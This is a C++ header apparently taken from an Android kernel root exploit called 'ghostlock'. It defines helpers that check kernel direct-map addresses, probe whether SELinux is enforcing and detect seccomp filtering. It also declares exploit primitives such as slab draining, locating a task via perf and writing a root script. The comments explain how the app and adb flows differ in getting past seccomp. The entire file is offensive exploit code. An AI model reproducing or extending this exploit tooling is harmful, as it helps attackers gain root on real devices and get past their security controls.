#ifndef GHOSTLOCK_EXPLOIT_OPS_HPP
#define GHOSTLOCK_EXPLOIT_OPS_HPP

#include "common.h"
#include "support/status.hpp"

#include <array>

namespace ghostlock::attack {
    /* Shared timeline and execution-settings accessors. These stay inline so the
 * hot paths (PI workers) keep the exact code shape they had when this lived
 * in main.cpp. */
    inline struct timespec &exploit_t0(void) {
        static struct timespec t0;
        return t0;
    }

    inline void timer_reset(void) {
        clock_gettime(CLOCK_MONOTONIC, &exploit_t0());
    }

    inline double timer_ms(void) {
        return ghostlock::runtime_time::runtime_elapsed_ms(&exploit_t0());
    }

        inline int32_t in_direct_map(uintptr_t target) {
        return target > ghostlock::kernel::DIRECT_MAP_BASE &&
               target < ghostlock::kernel::g_direct_map_end;
    }

    inline int32_t check_selinux_off(void) {
        ghostlock::support::UniqueFd efd(open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC));
        if (!efd.valid()) {
            /* untrusted_app often cannot read enforce while SELinux is enforcing. */
            return 0;
        }
        std::array < char, 4 > b{};
        read(efd.get(), b.data(), b.size());
        return b[0] == '0';
    }

    inline int32_t enforce_readable(void) {
        ghostlock::support::UniqueFd efd(open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC));
        return efd.valid() ? 1 : 0;
    }

    inline int32_t process_has_seccomp(void) {
        /* The app flow runs inside zygote, whose seccomp filter blocks
     * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
     * fork() inherits that, so the W2 child does not need W3 there. */
        FILE *status = fopen("/proc/self/status", "r");
        if (!status) return 0;
        auto close_status = ghostlock::support::make_scope_exit(
            [status]() noexcept { fclose(status); });
        char line[256];
        int32_t seccomp = 0;
        while (fgets(line, sizeof(line), status)) {
            if (strncmp(line, "Seccomp:", 8) == 0) {
                seccomp = atoi(line + 8);
                break;
            }
        }
        return seccomp != 0;
    }

    /* Launch: profile installation, validation and address resolution. */
    void log_execution_settings(const struct ghostlock::profile::kernel_offsets *profile);

    void resolve_profile_addresses(void);

    void install_profile(const struct ghostlock::profile::kernel_offsets &decoded);

    /* Attack primitives that stay in exploit_ops.cpp. */
    void apply_iomem_cache(void);

    void slab_drain(void);

    void write_root_script(void);

    uintptr_t perf_find_task(void);
} // namespace ghostlock::attack

/* The macro stays outside the namespace; the timer accessor is qualified so
 * macro users do not need a using-declaration. */
#define TIMER(label) do { \
    pr_info("[T+%.0fms] %s\n", ghostlock::attack::timer_ms(), label); \
    ghostlock::support::log_sync(); \
  } while (0)

#endif
